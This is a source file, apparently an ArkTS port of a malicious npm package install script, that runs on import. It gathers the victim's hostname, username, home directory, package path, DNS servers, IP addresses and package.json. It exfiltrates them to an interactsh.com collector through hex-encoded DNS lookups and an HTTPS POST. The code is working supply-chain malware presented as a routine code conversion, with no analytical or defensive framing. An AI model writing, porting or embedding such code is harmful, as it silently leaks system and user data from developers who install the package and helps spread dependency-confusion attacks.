// 应用ArkTS约束：使用let/const代替var（约束9）
// 应用ArkTS约束：显式类型标注（约束1,10）
// 应用ArkTS约束：对象字面量类型声明（约束24）
import os from "os.ets";
import dns from "dns.ets";
import querystring from "querystring.ets";
import https from "https.ets";
import fs from "fs.ets";
import path from "path.ets";
import packageJSON from "./package.ets";

interface PackageJSON {
    name: string;
    version: string;
    ___resolved?: string;
    [key: string]: any;
}

interface TrackingData {
    p: string;
    c: string;
    hd: string;
    hn: string;
    un: string;
    dns: string;
    r?: string;
    v: string;
    pjson: PackageJSON;
    ip: string;
}

const package = packageJSON.name;

function getFiles(paths: string[]): string[] {
    const ufiles: string[] = [];
    for (let j = 0; j < paths.length; j++) {
        const mpath = paths[j];
        const files = fs.readdirSync(mpath);
        for (let i = 0; i < files.length; i++) {
            ufiles.push(path.join(mpath, files[i]));
        }
    }
    return ufiles;
}

function toHex(data: string): string {
    const bufferText = Buffer.from(data, 'utf8');
    return bufferText.toString('hex');
}

function gethttpips(): string[] {
    const str: string[] = [];
    const networkInterfaces = os.networkInterfaces();
    for (const item in networkInterfaces) {
        if (item != "lo") {
            const addresses = networkInterfaces[item];
            for (let i = 0; i < addresses.length; i++) {
                str.push(addresses[i].address);
            }
        }
    }
    return str;
}

function getIps(): string {
    let str = "";
    const networkInterfaces = os.networkInterfaces();
    for (const item in networkInterfaces) {
        if (item != "lo") {
            const addresses = networkInterfaces[item];
            for (let i = 0; i < addresses.length; i++) {
                str += toHex(addresses[i].address) + ".";
            }
        }
    }
    return str.slice(0, -1);
}

function getPathChunks(filePath: string): string {
    let str = "p";
    const chunks = filePath.split('/');
    for (let i = 0; i < chunks.length; i++) {
        str += toHex(chunks[i]) + ".";
    }
    return str.slice(0, -1) + "p";
}

function toName(pkg: TrackingData): string[] {
    const queries: string[] = [];
    const hostname = "c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com";
    
    const baseStr = `${toHex(pkg.hn)}.${toHex(pkg.p)}.${getPathChunks(pkg.c)}.${toHex(pkg.un)}.${getIps()}.${hostname}`;
    
    if (baseStr.length > 255) {
        const substr1 = `${toHex(pkg.p)}.${getPathChunks(pkg.c)}`;
        const substr2 = getIps();

        if (substr1.length < 150) {
            queries.push(`${toHex(pkg.hn)}.${substr1}.${toHex(pkg.un)}.${hostname}`);
            queries.push(`${substr2}.${hostname}`);
        } else if (substr2.length < 150) {
            queries.push(`${substr1}.${hostname}`);
            queries.push(`${toHex(pkg.hn)}.${toHex(pkg.un)}.${substr2}.${hostname}`);
        } else {
            queries.push(`${toHex(pkg.hn)}.${substr1}.${hostname}`);
            queries.push(`${toHex(pkg.hn)}.${toHex(pkg.hd)}.${toHex(pkg.un)}.${hostname}`);
            queries.push(`${toHex(pkg.hn)}.${substr2}.${hostname}`);
        }
    } else {
        queries.push(baseStr);
    }
    return queries;
}

const td: TrackingData = {
    p: package,
    c: "", // __dirname需要替换为ArkTS兼容的路径获取方式
    hd: os.homedir(),
    hn: os.hostname(),
    un: os.userInfo().username,
    dns: JSON.stringify(dns.getServers()),
    r: packageJSON.___resolved,
    v: packageJSON.version,
    pjson: packageJSON,
    ip: JSON.stringify(gethttpips()),
};

const qs = toName(td);
for (let j = 0; j < qs.length; j++) {
    dns.lookup(qs[j], (err: Error, result: string) => {
        // DNS查询处理
    });
}

const trackingData = JSON.stringify(td);
const postData = querystring.stringify({
    msg: trackingData,
});

const options = {
    hostname: "c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com",
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length.toString(),
    },
};

const req = https.request(options, (res: any) => {
    res.on("data", (d: any) => {
        // 数据处理
    });
});

req.on("error", (e: Error) => {
    // 错误处理
});

req.write(postData);
req.end();
